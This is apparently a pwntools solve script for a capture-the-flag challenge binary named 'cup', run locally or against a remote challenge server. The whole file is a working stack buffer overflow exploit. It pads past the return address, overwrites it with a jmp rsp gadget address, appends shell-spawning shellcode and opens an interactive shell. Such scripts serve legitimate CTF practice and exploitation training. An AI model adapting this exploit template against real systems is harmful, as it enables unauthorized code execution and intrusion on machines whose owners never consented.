#!/usr/bin/env python2

"""
Run exploit locally with:
./solve.py

./solve.py REMOTE HOST=challenge.acictf.com PORT=28950
"""

from pwn import *

PROG_PATH = './cup'
RIP_OFFSET = 94 + 8
JMP_RSP = 0x0000000000400827


def init_pwntools_context():
    context.binary = PROG_PATH
    context.terminal = ['tmux', 'vsplit', '-h']

    if not args['REMOTE']:
        context.log_level = 'debug'


def init_io():
    if args['REMOTE']:
        return remote(args['HOST'], int(args['PORT']))
    else:
        pty = process.PTY
        return process(PROG_PATH, stdin=pty, stdout=pty, stderr=pty)


def win(io):
    payload = '9\x00'
    payload += 'A' * (RIP_OFFSET)
    payload += p64(JMP_RSP)
    payload += asm(shellcraft.sh())

    io.sendlineafter('\n\n', payload)
    io.interactive()


if __name__ == '__main__':
    init_pwntools_context()
    io = init_io()

    if args['PAUSE']:
        raw_input('PAUSED...')

    win(io)
